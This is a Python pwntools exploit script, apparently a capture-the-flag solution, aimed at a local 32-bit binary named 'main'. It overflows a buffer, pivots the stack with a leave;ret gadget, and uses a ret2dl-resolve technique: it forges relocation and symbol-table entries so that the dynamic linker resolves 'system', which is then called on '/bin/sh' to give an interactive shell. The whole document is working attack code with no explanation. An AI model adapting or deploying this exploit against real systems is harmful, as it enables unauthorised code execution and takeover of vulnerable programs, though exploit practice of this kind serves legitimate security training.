from pwn import*
p = process('./main')
rop = ROP('./main')
elf = ELF('./main')

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
leave_ret = 0x080483A8
base_stage = 0x804A520
p.send('\x00'*0x28 + p32(base_stage -4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_stage) + p32(0x100))
fake_sym_addr = base_stage + 24 #fake_sym
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) #alignment
fake_sym_addr = fake_sym_addr + align # 
index_dynsym = (fake_sym_addr - dynsym) / 0x10
st_name = fake_sym_addr + 0x10 - dynstr #system
fake_read_sym = flat([st_name, 0, 0, 0x12])

index_offset = base_stage + 16 - rel_plt
read_got = elf.got['read']
r_info = (index_dynsym << 8) | 0x7 
fake_read_reloc = flat([read_got, r_info])

payload  = p32(plt0)
payload += p32(index_offset)
payload += 'UUUU'
payload += p32(base_stage + 80) # binsh
payload += fake_read_reloc
payload += 'U'*align
payload += fake_read_sym
payload += 'system\x00'
payload += 'U' * (80 -len(payload))
payload += '/bin/sh\x00'
payload += 'U'*(100 - len(payload))
p.sendline(payload)
sleep(0.05)
p.interactive()
